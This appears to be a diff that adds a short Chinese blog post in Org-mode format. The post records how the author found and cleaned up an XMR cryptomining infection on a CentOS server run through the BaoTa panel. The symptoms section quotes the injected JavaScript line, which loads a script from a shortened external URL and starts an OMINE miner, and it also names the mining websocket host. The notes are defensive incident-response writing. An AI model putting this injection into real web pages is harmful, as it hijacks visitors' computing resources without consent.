@@ -1,0 +1,57 @@
+#+TITLE:  XMR 恶意挖矿脚本处理笔记 
+#+AUTHOR:    zrg
+#+EMAIL:     zrg1390556487@gmail.com
+#+LANGUAGE:  cn
+#+OPTIONS:   H:3 num:t toc:nil \n:nil @:t ::t |:t ^:nil -:t f:t *:t <:t
+#+OPTIONS:   TeX:t LaTeX:t skip:nil d:nil todo:t pri:nil tags:not-in-toc
+#+INFOJS_OPT: view:plain toc:t ltoc:t mouse:underline buttons:0 path:http://cs3.swfc.edu.cn/~20121156044/.org-info.js />
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="http://cs3.swfu.edu.cn/~20121156044/.org-manual.css" />
+#+EXPORT_SELECT_TAGS: export
+#+HTML_HEAD_EXTRA: <style>body {font-size:14pt} code {font-weight:bold;font-size:12px; color:darkblue}</style>
+#+EXPORT_EXCLUDE_TAGS: noexport
+#+LINK_UP:   
+#+LINK_HOME: 
+#+XSLT: 
+
+#+STARTUP: showall indent
+#+STARTUP: hidestars
+#+BEGIN_EXPORT HTML
+---
+layout: post
+title: XMR 恶意挖矿脚本处理笔记
+author: zrg
+description:   
+excerpt: 
+comments: false
+categories: 
+- Linux
+tags:
+- 恶意挖矿
+- 病毒
+---
+#+END_EXPORT
+
+# (setq org-export-html-use-infojs nil)
+感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
+# (setq org-export-html-style nil)
+
+* 事件描述
+** 概况
+: 服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
+: 服务器上所有站点使用宝塔面板面板管理，所以唯一的可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
+: 未能查到相关日志，所以判断是宝塔面板被攻破也只是猜测。
+** 表象
+: 下面陈述被攻击后的表象：
++ 服务器资源被大量占用，资源占用率飙升；
++ 服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');）
++ 网站无法加载，会出现浏览器卡死的情况
+* 问题排查及解决
+** 排查
+: 1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
+: 2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。
+** 解决
+: 1. 删除站点所有感染 js 文件；
+: 2. 从代码仓库pull，重新上传部署。
+* 参考
++ [[https://www.cnblogs.com/Rebybyx/p/9913779.html][XMR恶意挖矿脚本处理笔记]]
++ [[https://www.freebuf.com/articles/system/186743.html][XMR恶意挖矿案例简析]]
